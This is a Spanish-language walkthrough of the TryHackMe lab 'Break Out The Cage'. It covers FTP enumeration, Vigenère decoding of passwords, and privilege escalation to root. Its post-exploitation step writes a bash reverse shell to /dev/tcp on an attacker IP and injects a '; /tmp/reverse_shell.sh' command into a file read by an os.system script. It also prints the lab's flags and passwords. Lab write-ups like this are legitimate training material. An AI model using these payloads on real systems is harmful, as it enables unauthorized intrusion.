**Solución CTF  -  Break Out The Cage**

**CTF de Try Hack Me, paso a paso con explicación de técnicas de
enumeración, explotación y post-explotación en Linux.**

![](media_brek_out_the_cage/media/image1.png)

**La IP objetivo será: 10.201.111.23**

![](media_brek_out_the_cage/media/image2.png)

Se realizó un escaneo con Nmap utilizando las opciones **-sV** para
identificar versiones de servicios y **-sC** para ejecutar scripts por
defecto. Como resultado, se identificó que el servicio FTP permite
**login anónimo** y cuenta con un archivo "**dad_tasks**" con permisos
de lectura. (Comando: **nmap -sV -sC -p 10.201.111.23**).

![](media_brek_out_the_cage/media/image3.png)

Se realiza una conexión ftp con el user: anonymous y password:
anonymous.
Comando: ftp 10.201.111.23

![](media_brek_out_the_cage/media/image4.png)

Se descarga el archivo con el comando: "**get dad_tasks**" para
revisarlo.
![](media_brek_out_the_cage/media/image5.png)

Se verifica que este descargado en el directorio de Kali y se visualiza
con el comando: "**cat dad_tasks**" el contenido que está codificado en
base 64.
![](media_brek_out_the_cage/media/image6.png)

Se decodifica con el comando: **cat dad_tasks \| base64 -d**, sin
embargo aparece un texto no
legible.
![](media_brek_out_the_cage/media/image7.png)

Se utiliza la URL: **<https://www.dcode.fr/vigenere-cipher>** para
decodificarlo, en la parte derecha se copia todo el texto y damos click
en "AUTOMATIC DECRYPTION", en la parte izquierda se visualiza el texto
legible, la cual se muestra la contraseña:
**Mydadisghostrideraintthatcoolnocausehesonfirejokes**
![](media_brek_out_the_cage/media/image8.png)

Se prueba el acceso ssh con el usuario: Weston y la contraseña:
**Mydadisghostrideraintthatcoolnocausehesonfirejokes,** el usuario
Weston fue dada en el mismo CTF, la cual se validó que era su
contraseña.

**Comando: ssh <weston@10.201.111.23>**

![](media_brek_out_the_cage/media/image9.png)
![](media_brek_out_the_cage/media/image10.png)

Se ejecuta el comando **sudo -l** para verificar qué comandos o rutas
puede ejecutar el usuario con privilegios de
sudo.
![](media_brek_out_the_cage/media/image11.png)

Se ejecuta dicha ruta como prueba y solo nos muestra texto: "**AHHHHHHH
THEEEEE BESSSSSSSSSS !!!!!!".**

![](media_brek_out_the_cage/media/image12.png)

Se puede ejecutar el comando como root, pero no se puede editar, no se
puede escalar privilegios por ahí, sin embargo usa wall pero con un
mensaje fijo.

![](media_brek_out_the_cage/media/image13.png)

Se verifica que usuarios existen en el sistema: **cage** y **Weston,**
con el comando: **ls /home**

![](media_brek_out_the_cage/media/image14.png)

Se realiza una búsqueda de archivos que le pertenecen al usuario:
**cage**, y se encuentran 2 archivos:
**/opt/.dads_scripts/spread_the_quotes.py**
y **/opt/.dads_scripts/.files/.quotes**, con el comando: **find / -type
f -user cage 2\>/dev/null**

![](media_brek_out_the_cage/media/image15.png)

Se revisó el contenido del archivo
"**/opt/.dads_scripts/spread_the_quotes.py**" y se visualiza el texto
"**os.system()**" la cuál es una función de Python que ejecuta comandos
en la terminal del sistema operativo, además el parámetro "**wall**" que
aparece en la ruta **/usr/bin/bees**, comando: **cat
/opt/.dads_scripts/spread_the_quotes.py**

![](media_brek_out_the_cage/media/image16.png)

Se revisó el contenido del archivo
"**/opt/.dads_scripts/.files/.quotes**" y se observa textos legibles,
comando: **cat /opt/.dads_scripts/.files/.quotes**

![](media_brek_out_the_cage/media/image17.png)

Se observa que se tiene privilegios para leer, modificar, pero no para
ejecutar ese archivo, con el comando: **ls -la
/opt/.dads_scripts/.files/.quotes**

![](media_brek_out_the_cage/media/image18.png)

Se crea un archivo de nombre "reverse_shell.sh" dentro de /tmp/:

Comando: **vim /tmp/reverse_shell.sh**, luego se agrega:

**#!/bin/bash**

**/bin/bash -c \"bash -i \>& /dev/tcp/10.201.97.182/4444 0\>&1\",** aqui
va la IP del Kali.

![](media_brek_out_the_cage/media/image19.png)

Se da privilegios al archivo creado con el comando: **chmod +x
/tmp/reverse_shell.sh**

![](media_brek_out_the_cage/media/image20.png)

Se modifica el contenido del archivo
"**/opt/.dads_scripts/.files/.quotes**" con el comando: **echo \";
/tmp/reverse_shell.sh\" \> /opt/.dads_scripts/.files/.quotes**, luego se
verifica que se realizó el cambio, con el comando: **cat
/opt/.dads_scripts/.files/.quotes**

![](media_brek_out_the_cage/media/image21.png)

Se ejecuta el comando: **sudo /usr/bin/bees**, debido a que el script
usa **wall**, con el fin de ejecutar posteriormente el archivo
"**/opt/.dads_scripts/.files/.quotes**" y en este último tiene el script
agregado para reverse_shell.

![](media_brek_out_the_cage/media/image12.png)

En otra terminal, se abre un puerto de escucha en el puerto 4444 usando
Netcat. Comando: **nc -lvnp 4444 y** luego de unos segundos se consigue
el acceso con el usuario **cage**.

![](media_brek_out_the_cage/media/image22.png)

Se visualizan los archivos que tiene en el directorio actual, comando:
**ls**

![](media_brek_out_the_cage/media/image23.png)

Se revisa el contenido del archivo "**Super**\_**Duper_Checklist**",
comando: **cat Super_Duper_Checklist** y se encuentra el 1er Flag:
**THM{M37AL_0R_P3N_T35T1NG}**

![](media_brek_out_the_cage/media/image24.png)

Se dirige a la carpeta "**email_backup**" con el comando: **cd
email_backup**

![](media_brek_out_the_cage/media/image25.png)

Luego se visualiza que hay 3 correos. Comando: **ls**

![](media_brek_out_the_cage/media/image26.png)

Se visualiza el contenido del correo "**email_3**", con el comando:
**cat email_3,** donde se encuentra el String:
"**haiinspsyanileph**"
![](media_brek_out_the_cage/media/image27.png)

En la Plataforma de cyberchef: <https://gchq.github.io/CyberChef/>, en
el lado derecho se copia el string y en la parte izquierda se decodifica
desde Vigenere con la palabra clave: **FACE**, la cuál esta última se
repite constantemente. Obteniendo el password "**cageisnotalegend**" del
usuario root.

![](media_brek_out_the_cage/media/image28.png)
![](media_brek_out_the_cage/media/image29.png)

Se acceder al usuario **root** y se ingresa el password, obteniendo asi
el acceso a root, comando: **su root**

![](media_brek_out_the_cage/media/image30.png)

Se dirige a la carpeta **/root**, luego se ingresa a la carpeta
"**email_backup**", comandos: **cd /root, ls y cd email_backup**

![](media_brek_out_the_cage/media/image31.png)
![](media_brek_out_the_cage/media/image32.png)
![](media_brek_out_the_cage/media/image33.png)

Dentro se encuentran 2 correo, se visualiza el contenido del correo
"**email_2**", con los comandos: **ls y cat email_2,** donde se
encuentra la 2da Flag: **THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}**

![](media_brek_out_the_cage/media/image34.png)

![](media_brek_out_the_cage/media/image35.png)

Eso es todo xd, estaré subiendo mas soluciones de CTF en los siguientes
días, comenten si quiere que resuelva un CTF en especifico.
